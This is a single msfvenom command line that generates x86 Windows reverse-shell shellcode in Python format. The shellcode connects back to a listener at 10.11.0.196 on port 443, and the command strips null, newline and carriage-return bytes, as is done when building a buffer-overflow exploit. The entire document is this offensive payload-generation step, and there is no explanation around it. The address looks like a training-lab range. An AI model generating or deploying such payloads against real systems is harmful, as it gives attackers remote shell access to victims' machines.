msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.196 LPORT=443 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a\x0d"

